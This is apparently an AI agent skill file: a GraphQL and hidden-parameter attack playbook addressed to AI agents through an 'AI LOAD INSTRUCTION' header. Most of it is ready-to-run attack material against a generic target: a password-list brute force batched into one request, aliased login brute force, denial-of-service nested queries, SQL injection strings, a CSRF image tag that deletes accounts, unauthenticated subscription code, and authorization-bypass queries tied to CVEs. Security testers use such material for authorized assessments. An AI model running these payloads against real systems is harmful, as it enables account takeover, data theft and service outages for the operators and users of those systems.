---
name: graphql-and-hidden-parameters
description: >-
  GraphQL and hidden parameter testing playbook. Use when exploring introspection, batching, alias and depth abuse, directive tricks, persisted queries, undocumented fields, hidden parameters, schema abuse, and GraphQL authorization gaps.
---

# SKILL: GraphQL and Hidden Parameters — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert GraphQL exploitation and hidden-parameter discovery. Covers endpoint probing, full introspection dumps and their bypasses (field-suggestion oracle, Clairvoyance), query batching/aliasing to defeat rate limits, depth/complexity DoS, @skip/@include directive enumeration, APQ/persisted-query abuse, hidden field extraction from mobile JS bundles, and nested-object authorization gaps. Critical because GraphQL collapses REST attack surface into one introspectable gateway where batching and aliasing amplify every weakness.

## 0. RELATED ROUTING

Use this file for GraphQL mechanism abuse and undocumented-field discovery. Also load:

- [api authorization and bola](../api-authorization-and-bola/SKILL.md) for object-level authorization testing on GraphQL-resolved objects (BOLA routing lives there, not here)
- [api auth and jwt abuse](../api-auth-and-jwt-abuse/SKILL.md) when batching/aliasing is used to brute-force auth tokens or defeat rate limits
- [api recon and docs](../api-recon-and-docs/SKILL.md) to discover the GraphQL endpoint itself and mine JS bundles
- [business logic vulnerabilities](../business-logic-vulnerabilities/SKILL.md) when GraphQL mutations enable state-machine or workflow bypasses

---

## 1. GRAPHQL ENDPOINT DISCOVERY & PROBING

GraphQL gateways are rarely advertised. Probe these path variants with both `POST` and `GET`, and multiple `Content-Type` values:

| Path variant | Notes |
|---|---|
| `/graphql`, `/graphql/v1`, `/graphql/public` | Most common |
| `/api/graphql`, `/api/v1/graphql`, `/api/v2/graphql` | Versioned under API root |
| `/gql`, `/query`, `/api/query` | Short/renamed variants |
| `/graphql/console`, `/graphiql`, `/playground` | Interactive consoles (Apollo Sandbox, GraphiQL) |
| `/v1/api`, `/api` | Some gateways accept GraphQL at the API root |

**Content-Type and verb matrix** — some servers only accept one combination:

```bash
# POST + JSON (standard)
curl -s -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}'

# GET + query param (firewall-friendly, useful for SSRF/redirect chains)
curl -s "https://target/graphql?query={__typename}"

# GET + URL-encoded (bypasses some WAFs that only inspect JSON bodies)
curl -s "https://target/graphql?query=%7B__typename%7D"

# application/graphql content type
curl -s -X POST https://target/graphql \
  -H "Content-Type: application/graphql" \
  -d '{__typename}'

# x-www-form-urlencoded (rare, seen in legacy gateways)
curl -s -X POST https://target/graphql \
  -d 'query={__typename}'
```

**Quick probe script** — confirm a live endpoint regardless of introspection:

```bash
for p in /graphql /api/graphql /graphql/v1 /gql /api/v1/graphql /query; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://target$p" \
    -H "Content-Type: application/json" -d '{"query":"{__typename}"}')
  echo "$p -> $code"
done
```

A `200` with `"data":{"__typename":"..."}` confirms the endpoint. A `400`/`405` with a GraphQL-shaped error body also confirms it even when introspection is disabled.

---

## 2. FULL INTROSPECTION DUMP

When introspection is enabled, extract the entire schema in one shot. This reveals every type, field, argument, and relation — the foundation for all downstream attacks.

**Minimal introspection**:
```graphql
query { __schema { types { name } } }
```

**Full introspection query** (dump all fields, arguments, types, directives):

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      locations
      args { ...InputValue }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  fields(includeDeprecated: true) {
    name
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated
    deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) {
    name
    isDeprecated
    deprecationReason
  }
}
fragment InputValue on __InputValue {
  name
  type { ...TypeRef }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType { kind name ofType { kind name } }
      }
    }
  }
}
```

**Dump with curl + jq to flat endpoint list**:

```bash
curl -s -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{queryType{name}mutationType{name}types{kind name fields{args{name type{name kind ofType{name kind}}} type{name kind ofType{name kind}}}}}}"}' \
  | jq -r '.data.__schema.types[] | select(.kind=="OBJECT") | .fields[]? | "\(.name)(\(.args|map("\(.name):\(.type)")|join(",")))"'
```

**From the dump, prioritize**:
- `Mutation` type fields (write operations, often under-authorized)
- types named `Admin*`, `Internal*`, `Debug*`, `Legacy*`, `Export*`
- fields marked `isDeprecated: true` (still active, often forgotten in authz)
- arguments named `role`, `tenantId`, `isAdmin`, `filter`, `asUserId`
- `Subscription` type (WebSocket endpoints, frequently unauthenticated)

---

## 3. INTROSPECTION BYPASS WHEN DISABLED

Many production deployments disable introspection. The schema is still largely recoverable through error oracles.

### 3a. Field Suggestion Oracle

Apollo and graphql-js return "Did you mean..." hints on typo'd fields. This is a byte-by-byte schema extraction oracle:

```bash
# Request a non-existent field; server suggests real ones:
POST /graphql
{"query":"{ user { emal } }"}

# Response leaks the real field:
# "Cannot query field 'emal' on type 'User'. Did you mean 'email'?"
```

Automate with **Clairvoyance** — reconstructs the entire schema from suggestion errors alone:

```bash
pip3 install clairvoyance
clairvoyance -o schema.json -w 8 https://target/graphql
# Repeatedly probes with guessed field names, harvests suggestions,
# builds a full GraphQL SDL schema.json with zero introspection.
```

### 3b. `__typename` Probing

`__typename` is a meta-field that works on every type even when introspection is off:

```graphql
query { user { __typename } }
# → {"data":{"user":{"__typename":"User"}}}
```

Walk every entry point, then guess relation names to map types one hop at a time.

### 3c. Known Type Probing via `__type`

Some servers block `__schema` but leave `__type(name:...)` reachable:

```graphql
{ __type(name: "User") { fields { name type { name kind } } } }
```

Iterate common type names: `User`, `Account`, `Order`, `Invoice`, `Admin`, `Mutation`, `Query`, `Subscription`, plus app-specific guesses from JS bundles (section 9).

### 3d. Error-Based Schema Inference

Force type errors to leak field/type names:

```graphql
query { user { id } }                 # if 'user' needs an arg: error reveals arg name/type
query { user(id: 1) { nonexistent } } # error reveals valid fields via suggestions
mutation { login }                    # error reveals required input fields
```

---

## 4. QUERY BATCHING ATTACKS

GraphQL batch queries send multiple operations in a single HTTP request. This is a force multiplier that bypasses per-request rate limits, brute-force protections, and 2FA gates.

### 4a. Standard Array Batching

```bash
# Send 1000 login attempts in ONE request → bypasses "max 5 logins/min" rules
curl -s -X POST https://target/graphql -H "Content-Type: application/json" -d '[
  {"query":"mutation{login(email:\"a@x.com\",password:\"123456\"){token}}"},
  {"query":"mutation{login(email:\"a@x.com\",password:\"password\"){token}}"},
  {"query":"mutation{login(email:\"a@x.com\",password:\"qwerty\"){token}}"}
]'
```

A 3-element array shows the pattern; a real attack ships thousands of entries generated from a wordlist:

```bash
python3 -c "
import json
pwds=open('rockyou.txt','rb').read().splitlines()[:2000]
body=[{'query':f'mutation{{login(email:\"admin@target.com\",password:\"{p.decode(errors=\"ignore\")}\"){{token}}}}'} for p in pwds]
open('batch.json','w').write(json.dumps(body))
"
curl -s -X POST https://target/graphql -H "Content-Type: application/json" --data-binary @batch.json | grep -o '"token":"[^"]*"'
```

### 4b. Rate-Limit Bypass for Enumeration

Batch ID enumeration so the WAF sees one request:

```json
[
  {"query":"{user(id:1){email}}"},
  {"query":"{user(id:2){email}}"},
  {"query":"{user(id:3){email}}"}
]
```

### 4c. Bypass via Single-Query Batching (Apollo)

Apollo also accepts multiple operations in one query string:

```bash
curl -X POST https://target/graphql -H "Content-Type: application/json" -d '{
  "query":"query A{user(id:1){email}} query B{user(id:2){email}}",
  "operationName":"A"
}'
```

---

## 5. ALIAS ATTACKS

Aliases let one query ask for the same field under many names. A single request can issue hundreds of operations — amplifying brute force, enumeration, and DoS.

### 5a. Aliased Brute Force (one request, many passwords)

```graphql
mutation {
  a1: login(email:"admin@target.com", password:"123456"){token}
  a2: login(email:"admin@target.com", password:"password"){token}
  a3: login(email:"admin@target.com", password:"qwerty"){token}
  a4: login(email:"admin@target.com", password:"letmein"){token}
  a5: login(email:"admin@target.com", password:"admin"){token}
}
```

One HTTP request = five auth attempts. No rate limiter that counts requests will catch this.

### 5b. Aliased Enumeration

```graphql
query {
  u1: user(id: 1) { email role }
  u2: user(id: 2) { email role }
  u3: user(id: 3) { email role }
  u4: user(id: 4) { email role }
}
```

### 5c. Alias Amplification for DoS

Combine aliases with nested fields to multiply resolver cost:

```graphql
query {
  a1: search(term:"x"){ edges { node { author { posts { edges { node { comments { edges { node { author { name } } } } } } } } } } }
  a2: search(term:"x"){ edges { node { author { posts { edges { node { comments { edges { node { author { name } } } } } } } } } } }
  # repeat 100x
}
```

---

## 6. DEPTH & COMPLEXITY ATTACKS (DoS)

Recursive and deeply nested queries exhaust CPU/memory on the resolver layer even with tiny request bodies.

### 6a. Recursive Self-Referential Query

```graphql
query {
  user(id:1){
    friends{
      friends{
        friends{
          friends{
            friends{ id }
          }
        }
      }
    }
  }
}
```

### 6b. Circular Type Reference Explosion

If `Comment → Post → Comments → Post...` exists, a depth-10 query fans out exponentially:

```graphql
query {
  post(id:1){
    comments{
      post{
        comments{
          post{
            comments{ id body }
          }
        }
      }
    }
  }
}
```

### 6c. Inline Fragment + Interface Fan-Out

```graphql
query {
  search(text:"a"){
    ... on User { posts { author { posts { id } } } }
    ... on Page { owner { pages { id } } }
    ... on Group { members { groups { id } } }
  }
}
```

**Detection**: if the server lacks depth/complexity limits, even a depth-7 query returns 500/504 or takes seconds. Report the cheapest payload that triggers resource exhaustion.

---

## 7. DIRECTIVE ABUSE (@skip / @include)

The built-in `@skip(if:)` and `@include(if:)` directives evaluate per-field at runtime. They double as a boolean oracle to enumerate fields without introspection.

### 7a. Field Existence Oracle

```graphql
query($b: Boolean!){
  user(id:1){
    email @include(if: $b)
    ssn   @include(if: $b)
    role  @include(if: $b)
  }
}
# If a field doesn't exist, server errors even when @include(if:false).
# Compare errors field-by-field to map the schema.
```

### 7b. Conditional Enumeration via @skip

Toggle `@skip` to conditionally test one field at a time across a batch of aliases — effectively a per-field fuzz without introspection.

### 7c. Custom Directive Probing

Some servers expose custom directives (`@auth`, `@deprecated`, `@cacheControl`, `@cost`). Probe them; `@auth` overrides sometimes disable authorization:

```graphql
query { adminUsers @auth(required:false) { id email } }
```

---

## 8. PERSISTED QUERIES & APQ

Automatic Persisted Queries (APQ) and persisted-query support let clients send a hash instead of the full query. Hash-only requests can leak or be brute-forced.

### 8a. APQ Hash-Only Request

```bash
# Apollo APQ: send only the hash; server returns full query if it has it cached
curl "https://target/graphql?extensions=%7B%22persistedQuery%22%3A%7B%22version%22%3A1%2C%22sha256Hash%22%3A%22<HASH>%22%7D%7D"
# Response: {"errors":[{"message":"PersistedQueryNotFound"}]} OR the cached query result
```

### 8b. Query Retrieval via Hash

If the server has the query cached, sending just the hash executes it — useful when you guess/leak hashes from client JS bundles (they're often embedded as constants).

### 8c. Forcing Registration

Send a hash + query to "register" it, then execute via hash alone — bypassing query denylists that inspect the query string:

```bash
# Register (server stores query under your hash)
curl -X POST https://target/graphql -H "Content-Type: application/json" -d '{
  "query":"{ allUsers { email passwordHash } }",
  "extensions":{"persistedQuery":{"version":1,"sha256Hash":"deadbeef..."}}
}'
```

---

## 9. HIDDEN FIELD DISCOVERY

Beyond introspection, field names leak from client code.

### 9a. Mobile/Web JS Bundle Mining

```bash
# Extract GraphQL field/operation names from a JS bundle
curl -s https://target/static/js/main.abc123.js \
  | grep -oE '\b[a-zA-Z]+(ById|ByAdmin|Internal|Export|Debug|All|Raw)\b' | sort -u

# Grep for inline query strings
curl -s https://target/static/js/main.abc123.js \
  | grep -oE '(query|mutation|subscription)\s+[A-Za-z]+' | sort -u

# Extract persisted-query hashes from the bundle
curl -s https://target/static/js/main.abc123.js \
  | grep -oE '[a-f0-9]{64}' | sort -u
```

### 9b. Source Map Leakage

```bash
# If .map files are exposed, recover original field names
curl -s https://target/static/js/main.abc123.js.map | jq -r '.sources[]'
# Reconstructed source often contains admin/internal field names stripped from prod build
```

### 9c. Deprecated / Admin Field Diff

Compare introspection results (with `includeDeprecated:true`) against the public API docs. Deprecated fields are usually still resolvable:

```graphql
query { user(id:1){ ssn role adminNotes internalId } }
```

---

## 10. NESTED AUTHORIZATION GAPS

The classic GraphQL authorization flaw: top-level resolvers check permissions, but nested relation fields do not. This lets you read another user's private fields by traversing relationships from an object you legitimately can access.

### 10a. Cross-User Private Field via Relationship

```graphql
# You can query your own profile, but the nested 'followers' resolver
# doesn't re-check authorization on each follower's private fields:
query {
  myProfile {
    followers {
      id
      email          # other users' private email
      privateEmail   # admin-only field, no nested check
      phoneNumber
    }
  }
}
```

### 10b. Indirect Object Reference via Edges

```graphql
# Access a target user's data through a shared relation
query {
  organization(id: 1) {
    members {          # you can see org members
      id
      orders {          # nested resolver leaks ALL members' orders
        total
        billingAddress  # PII
      }
    }
  }
}
```

### 10c. Mutation Input Traversal

Mutations often accept nested input objects whose fields bypass field-level authz:

```graphql
mutation {
  updateProfile(input: {
    name: "x",
    account: { role: "admin", tier: "premium", verified: true }
  }) { user { id role } }
}
```

> **Note**: generic BOLA testing on object IDs lives in [api authorization and bola](../api-authorization-and-bola/SKILL.md). This section focuses on GraphQL-specific nested/edge authorization.

---

## 11. MUTATIONS & SUBSCRIPTIONS

### 11a. Mutation Abuse

Mutations are write operations and frequently lack the authorization depth of query resolvers:

```graphql
mutation {
  # Mass update across users if the mutation doesn't scope by caller
  updateUser(id: 2, role: "admin") { id role }
  # Delete-as-self
  deletePost(id: 9999) { id }
  # State-machine skip
  updateOrder(id: 1234, status: "delivered") { id }
}
```

### 11b. Subscription Endpoints

Subscriptions run over WebSocket (`graphql-ws` / `graphql-transport-ws`) and are routinely unauthenticated because the HTTP auth middleware doesn't apply to the WS upgrade:

```javascript
// node reconnecting-websocket
const ws = new WebSocket("wss://target/graphql", "graphql-transport-ws");
ws.onopen = () => ws.send(JSON.stringify({type:"connection_init", payload:{}}));
ws.onopen = () => ws.send(JSON.stringify({
  id:"1", type:"subscribe",
  payload:{query:"subscription{ newOrder { id customer email total } }"}
}));
// Often receives every tenant's real-time events with no auth.
```

---

## 12. HIDDEN PARAMETER DISCOVERY (REST + GRAPHQL)

Hidden/undocumented parameters are settable or readable fields absent from public docs but present in the schema or client code.

| Source | What to extract |
|---|---|
| OpenAPI spec | optional/deprecated fields, `additionalProperties:true`, admin examples |
| Admin docs vs public docs | diff reveals role/tenant/internal fields |
| Mobile request bodies | richer than web — `role`, `orgId`, `featureFlag`, `tenantId` |
| Feature flags | `experimental`, `beta`, `internal` fields |
| GraphQL introspection | deprecated args, admin-only input fields |

### 12a. Additional Properties Abuse

```bash
# OpenAPI schema with additionalProperties:true → server accepts arbitrary keys
POST /api/v1/users
{"name":"x","role":"admin","isAdmin":true,"verified":true,"tenantId":"*"}
```

### 12b. Mobile-vs-Web Field Diff

Capture the same action from the mobile app and the web app. Mobile often sends extra fields the web UI never exposes:

```http
# Web registration
POST /api/v1/register
{"email":"a@x.com","password":"pass"}

# Mobile registration (same endpoint)
POST /api/v1/register
{"email":"a@x.com","password":"pass","referralCode":null,"marketingOptIn":true,"role":"user","skipVerification":true}
```

Add the mobile-only fields to the web request to find mass-assignment-style privilege escalation.

### 12c. Feature-Flag Field Fuzz

Fuzz boolean/enum fields that gate features: `isInternal`, `betaAccess`, `debug`, `raw`, `asAdmin`, `impersonateUserId`, `X-Internal-User: true`.

---

## 13. GRAPHQL ATTACK QUICK REFERENCE

| Attack | Core payload shape | Bypasses |
|---|---|---|
| Introspection | `__schema{types{...}}` | nothing (if enabled) |
| Field suggestion oracle | typo'd field | introspection disable |
| Batching | `[{query},{query}]` array | per-request rate limit |
| Aliasing | `a1: login(...), a2: login(...)` | per-request rate limit |
| Depth DoS | nested `friends{friends{...}}` | none (no depth limit) |
| @skip/@include | field `@include(if:$b)` | field enumeration |
| APQ | `extensions.persistedQuery` | query-string denylist |
| Nested authz | `myProfile{followers{email}}` | top-level-only authz |

---

## 14. 2026 EMERGING TECHNIQUES

### 14.1 GraphQL over HTTP/2, SSE, and WebSocket

Subscriptions increasingly run over SSE (`text/event-stream`) and WebSocket transports, each with distinct auth gaps.

- **SSE subscription CORS flaw**: SSE endpoints are often configured with `Access-Control-Allow-Origin: *`; if the stream reads a cookie/`Authorization` from a same-origin fetch and emits cross-user events, a cross-origin `<EventSource>` subscribes to victim data. Test the event-stream endpoint with victim cookies from an attacker origin.
- **WebSocket subscription without auth**: `Sec-WebSocket-Protocol: graphql-transport-ws` connections frequently skip the Authorization check applied to HTTP POST. Connect unauthenticated and issue a `subscribe` to `userUpdated(id: VICTIM_ID)`; if events stream, subscription authz is missing.
- **HTTP/2 multiplexed batching**: HTTP/2 lets N queries ride one TCP connection as parallel streams. Per-IP and per-connection rate limits under-count; a single multiplexed connection exhausts OTP/login enumeration before any per-request limiter trips.

### 14.2 Persisted Query Abuse (APQ / Hive)

Apollo Automatic Persisted Queries (APQ) and Hive-managed persisted queries shift trust onto the hash. New abuses:

**APQ hash prediction** — APQ hashes are SHA-256 of the query text. When the query allowlist is client-bundled but the hash is the only server-side gate, an attacker mines the JS bundle for query strings, computes the hash, and submits hash-only requests:
```bash
# Predict the APQ hash for a known bundled query string:
echo -n 'mutation Login($u:String!,$p:String!){login(username:$u,password:$p){token}}' \
  | openssl dgst -sha256 -binary | xxd -p -c64
# → 0f8b...  (submit as extensions.persistedQuery.sha256Hash, no query body)
POST /graphql
{"extensions":{"persistedQuery":{"sha256Hash":"0f8b...","version":1}}}
```

**APQ hash collision / hash-only registration bypass**: if the server persists the first hash→query mapping it sees, an attacker who registers a hash first (or races the legitimate client) maps an allowlisted hash to a blacklisted query string — defeating query denylists that match on text. Submit a blacklisted query under a fresh hash; if the server later accepts the hash alone, the denylist is bypassed.

**Hive schema registry unauthorized**: Apollo Hive / Router persist queries server-side; an unauthenticated persisted-query fetch or a misconfigured persisted-query registration endpoint leaks the operation allowlist and embedded SDL.

### 14.3 Supergraph SDL Leakage with Introspection Disabled

Apollo Router/Rover supergraph deployments disable introspection but still serve the composed SDL to federation subgraphs via `_service`. Even with `__schema` blocked:
```graphql
# Federation _service field is often left exposed on the gateway:
{ _service { sdl } }
# → returns the full composed supergraph SDL including internal @auth/@requires directives
```
- **Hive schema registry**: Hive Cloud registries with public/anon read tokens expose the full SDL + operation allowlist; hunt for leaked `HIVE_TOKEN` in CI configs and mobile bundles.

### 14.4 LLM-Driven Schema Inference (Clairvoyance Enhanced)

With introspection off and field suggestions on, LLMs accelerate full schema reconstruction. The error oracle ("Cannot query field 'users' — did you mean 'user', 'usersById'?") plus type-coercion errors feed an LLM that proposes the next candidate field/type, converging on the complete schema far faster than brute-force Clairvoyance. Feed 50–100 suggestion responses into an LLM; have it emit ranked candidate `field(argument:Type)` probes and reconcile against new suggestions. Flag any `Admin/Internal/Deprecated` names it surfaces.

### 14.5 GraphQL-to-SQL Injection via Nested Resolvers

When nested-field depth and arguments are not whitelisted, user input traverses the resolver graph into raw SQL:
```graphql
query {
  orders(filter: { search: "' UNION SELECT password,1,1 FROM users--" }) {
    id
    items { product { name } }   # depth not whitelisted → resolver joins unsanitized input
  }
}
```
- Deeply nested fields whose resolvers build `WHERE`/`ORDER BY` from unvalidated arguments produce SQLi; the GraphQL type system validates JSON shape, not SQL semantics. Map every leaf argument to a raw SQL query and inject `' OR 1=1--`, `;--`, and boolean-blind payloads.

### 14.6 GraphQL CSRF via GET

Some servers accept `GET /graphql?query=...` (operation in query string). GET requests trigger **no CORS preflight** and are cookie-authenticated by default, so a cross-site `<img>`/`<form>` forces a victim's browser to execute a mutation:
```http
GET /graphql?query=mutation{deleteAccount(id:1)} HTTP/1.1
# Victim browses attacker page:
# <img src="https://target/graphql?query=mutation{deleteAccount(id:1)}">
# No preflight; cookie sent; mutation executed
```
Mitigations require `Content-Type: application/json` enforcement and rejecting GET mutations — test both.

### 14.7 2026 GraphQL Emerging Checklist

```
□ Test SSE/EventSource subscription endpoints cross-origin with victim cookies
□ Connect to subscription WebSocket unauthenticated; subscribe to other users' events
□ Use HTTP/2 multiplexing to bypass per-request/per-IP rate limits on batched queries
□ Mine JS bundles for query strings; compute APQ SHA-256 and submit hash-only requests
□ Race persisted-query registration to map allowlisted hash -> blacklisted query
□ Query { _service { sdl } } on Apollo Router/Federation gateways (introspection off)
□ Check Hive registry for public/anon read tokens in CI/mobile bundles
□ Feed field-suggestion errors to an LLM for accelerated schema inference
□ Inject SQLi payloads into nested resolver arguments (search/filter/sort/order)
□ Test GET /graphql?query=mutation{...} for preflight-free CSRF
```

### 14.8 Federated Sub-graph Injection (Confused Deputy)

In federated GraphQL (Apollo Federation, Hasura, WunderGraph), the Gateway splits queries and sends fragments to sub-graphs. Sub-graphs trust the Gateway implicitly and **strip their own authorization checks** — a classic Confused Deputy problem. An attacker manipulates the query structure to force the Gateway to inject malicious fragments into vulnerable sub-graphs:

```graphql
# Exploit: Leak internalRiskScore from Billing Sub-graph via fragment injection
query LeakRiskScore {
  node(id: "User:123") {
    ... on User {
      username
      _onBilling_internalRiskScore: internalRiskScore
    }
  }
}
```

```text
Execution flow:
  1. Gateway sees request for a Node → resolves the ID
  2. Query Planner sees internalRiskScore lives in Billing Sub-graph
  3. Gateway generates fetch to Billing Sub-graph:
     query { _entities(representations: [{ __typename: "User", id: "123" }]) {
       ... on User { internalRiskScore }
     }}
  4. Billing Sub-graph receives request — NO auth check (trusts Gateway)
  5. Returns internalRiskScore → leaked to attacker
```

**Why WAFs miss this**: The query is syntactically valid, uses standard `POST /graphql` with `application/json`, contains no SQL/shell payloads, and returns `200 OK` at the Gateway level.

### 14.9 Apollo Federation CVE Cluster (2025-2026)

| CVE | Vulnerability | CVSS | Fix |
|---|---|---|---|
| **CVE-2026-32621** | Prototype pollution via incomplete key sanitization — malicious field aliases/variable names target `Object.prototype` in gateway | High | Upgrade @apollo/gateway |
| **CVE-2025-64530** | Interface access control bypass — `@authenticated`/`@requiresScopes`/`@policy` on interface types NOT propagated to implementing types | High | Federation v2.9.5+/2.10.4+/2.11.5+/2.12.1+ |
| **CVE-2025-64173** | Polymorphic type auth failure — Router applies directives to interface, **ignoring** directives on implementing object types | High | Apollo Router 1.61.12+/2.8.1+ |
| **CVE-2025-64347** | Renamed directive bypass — `@authenticated` aliased via `@link` imports not enforced | High | Apollo Router 1.61.12+/2.8.1+ |
| **GHSA-m8jr-fxqx-8xx6** | Transitive field bypass — fields using `@requires`/`@fromContext` to depend on protected data don't inherit access control | High | Patch composition library |

**CVE-2025-64530 exploit** — query via implementing type, bypassing interface-level `@authenticated`:

```graphql
# Interface has @authenticated, but implementing type does NOT inherit it:
query {
  # Direct query on implementing type bypasses interface auth:
  Product(id: "1") {           # implements Node interface
    internalCostPrice           # protected on Node, not on Product
  }
}
```

### 14.10 Direct Sub-graph Exposure (Shadow Graph)

Even with a perfectly secured Gateway, sub-graph endpoints are often accidentally exposed via misconfigured load balancers, ingress controllers, SSRF in adjacent services, or predictable internal DNS names. An attacker who reaches a sub-graph directly bypasses ALL Gateway security:

```bash
# Direct sub-graph access — no JWT, no auth, just raw _entities query:
curl -X POST http://billing-service.internal:4000/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query": "query { _entities(representations: [{ __typename: \"User\", id: \"456\" }]) { ... on User { internalRiskScore invoices { amount } } } }"}'
```

**Detection**: Scan for exposed sub-graph endpoints:
```bash
# Common sub-graph ports
nmap -p 4000,4001,4002,5000,8000,8080,9000 target.internal

# Check if _service is exposed (leaks full SDL):
curl -s -X POST http://target:4000/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ _service { sdl } }"}'
```

### 14.11 Federation Authorization Testing Checklist

```text
□ Query interface fields via implementing types to test @authenticated inheritance
□ Test @requires/@fromContext dependent fields without requesting the protected source field
□ Check if @link-renamed directives are enforced by the Router
□ Probe sub-graph endpoints directly (bypass Gateway) for _entities and _service
□ Test prototype pollution via crafted field aliases/variable names (CVE-2026-32621)
□ Verify sub-graphs enforce independent authorization (not just Gateway-level)
□ Check for mTLS or HMAC signing between Gateway and sub-graphs
□ Query _service { sdl } on all sub-graph ports to extract full schema
□ Test federation _entities query with arbitrary __typename/id combinations
□ Scan internal network for exposed sub-graph endpoints
```

---

## 15. TESTING CHECKLIST

```
□ Probe /graphql, /api/graphql, /graphql/v1, /gql with POST+GET and multiple Content-Types
□ Confirm endpoint via __typename even when introspection is disabled
□ Run full introspection dump with includeDeprecated:true
□ Extract flat field/argument list with jq; flag Admin/Internal/Deprecated names
□ If introspection disabled: run Clairvoyance; use field-suggestion oracle; probe __type
□ Test query batching (array of N queries) against login/OTP/enumeration endpoints
□ Test aliasing (a1:..,a2:..) to brute force or enumerate in one request
□ Send depth-7+ recursive/circular query to test complexity limits
□ Use @skip/@include as a field-existence oracle on unknown types
□ Check APQ: send hash-only; mine JS bundle for persisted-query hashes
□ Mine web/mobile JS bundles + source maps for field/operation names
□ Query nested relations for cross-user private fields (followers.email, members.orders)
□ Test mutation inputs with nested role/tier/verified fields
□ Connect to subscription WebSocket; test unauthenticated event streaming
□ Diff mobile vs web request bodies for hidden settable fields
□ Fuzz additionalProperties / feature-flag fields (role, isAdmin, tenantId, asAdmin)
```

---

## 16. NEXT ROUTING

| Finding | Next Skill |
|---|---|
| Object ID manipulation exposes other users' data | [api authorization and bola](../api-authorization-and-bola/SKILL.md) |
| Batching/aliasing used to brute force tokens or OTPs | [api auth and jwt abuse](../api-auth-and-jwt-abuse/SKILL.md) |
| GraphQL endpoint not yet found / need JS-bundle recon | [api recon and docs](../api-recon-and-docs/SKILL.md) |
| Mutation enables workflow/state bypass | [business logic vulnerabilities](../business-logic-vulnerabilities/SKILL.md) |
